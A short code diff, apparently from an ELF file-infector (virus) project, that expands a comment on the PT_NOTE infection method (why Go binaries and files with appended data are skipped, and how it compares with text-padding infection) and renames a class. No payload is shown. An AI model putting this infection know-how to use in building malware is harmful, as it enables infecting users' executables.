@@ -32,11 +32,14 @@ namespace vt::infector {
 // We hence do not infect golang elfs. In addition, for binaries that have data
 // appended to the end of the file, we also give up because the application code
 // might reverse seek from the end of the file and look for data there (like
-// bazel). We also skip these. Other than that, this method pretty much allows
-// virus of any size to be inserted and has the highest success rate compared to
-// text padding and reverse text algorithms.
+// bazel). We also skip these even though we could just insert right before the
+// section header and shift everything back. The complexity is not worth it for
+// these binaries without being certain that this actually works (maybe it
+// will). Other than that, this method pretty much allows virus of any size to
+// be inserted and has the highest success rate compared to text padding and
+// reverse text algorithms.
 
-class PtNoteInfect {
+class PtNoteInfector {
  public:
   size_t injected_host_size();
 
